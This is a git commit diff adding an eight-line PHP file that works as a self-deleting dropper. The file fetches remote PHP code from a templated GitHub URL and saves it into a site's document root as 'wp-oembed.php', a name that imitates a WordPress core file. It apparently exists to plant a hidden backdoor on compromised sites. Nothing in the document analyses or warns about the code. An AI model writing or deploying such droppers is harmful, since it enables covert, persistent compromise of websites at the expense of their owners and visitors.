e0f790bc1f8d89221a92a5c8b037bf8786f26be7
dallasdilla <DallasDillard1997@proton.me>
2025-12-16 21:21:54 +0100

    Add files via upload

---
+++ ld_1/oEzt3CpE.php
@@ -0,0 +1,8 @@
+<?php
+unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
+$c = file_get_contents('https://raw.githubusercontent.com/{GIT_DATA}/refs/heads/main/{V2_SUBDIR}/{slug}.php');
+if (strpos($c, '<?php')===false)  die('err dl');
+if (is_file($_SERVER['DOCUMENT_ROOT'].'/wp-oembed.php')) die('file exist');
+$r = file_put_contents($_SERVER['DOCUMENT_ROOT'].'/wp-oembed.php', $c);
+if ($r===false) die('err saving');
+die('/wp-oembed.php');
